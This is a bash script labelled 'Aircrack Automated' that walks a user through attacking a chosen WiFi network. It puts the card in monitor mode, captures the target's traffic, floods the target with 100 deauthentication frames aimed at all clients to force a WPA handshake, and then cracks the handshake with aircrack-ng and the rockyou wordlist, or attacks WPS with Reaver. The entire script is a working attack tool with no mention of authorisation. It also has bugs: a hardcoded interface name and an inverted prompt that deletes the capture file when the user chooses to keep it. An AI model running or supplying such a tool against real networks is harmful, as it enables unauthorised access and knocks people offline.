#!/bin/bash
clear
echo "+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+"
echo "|A|i|r|c|r|a|c|k| |A|u|t|o|m|a|t|e|d|"
echo "+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+"
echo
echo Enter Interface Name:
read interface
echo Enter Monitor mode interface name:
read mon
echo "We will now use $mon"
sleep 2
airmon-ng start $interface
sleep 1
xterm -hold -e "airodump-ng wlan1mon"
echo Enter BSSID Of Target
read bid
echo $bid
echo Enter Channel Of Target
read chnl
client=FF:FF:FF:FF:FF:FF
xterm -hold -e "airodump-ng --ig -w cap -c $chnl --bssid $bid wlan1mon"
xterm -hold -e "aireplay-ng --ig --deauth 100 -a $bid -c $client wlan1mon"
sleep 4
clear
echo "Do you want to use a wordlist (y/n)"
read option
if [ $option == "n" ]; then
   xterm -hold -e "Reaver -i wlan1mon -b $bid -vv"
else
   echo "1. Use Default Wordlist(rockyou.txt)."
   echo "2. Specify a Custom One."
   read option2
   if [ $option2 == "1" ]; then
     wordlist="/usr/share/wordlists/rockyou.txt"
     xterm -hold -e "aircrack-ng -w $wordlist ./cap-01.cap"
   else
     echo Enter Path Of Your Custom Wordlist.
     read wordlist
     xterm -hold -e "aircrack-ng -w $wordlist ./cap-01.cap"
   fi 
fi
echo "1. Keep monitor mode on."
echo "2. Turn off monitor mode."
read d2
if [ $d2 == "1" ]; then
   sleep 1
else
   echo "Removing monitor mode"
   airmon-ng stop wlan1mon
fi
echo "Do you wish to keep the cap file (y/n)"
read d3
if [ $d3 == "y" ]; then
   rm cap*
else
   echo "The cap file has been kept"
fi
echo "we are finished"
echo done!
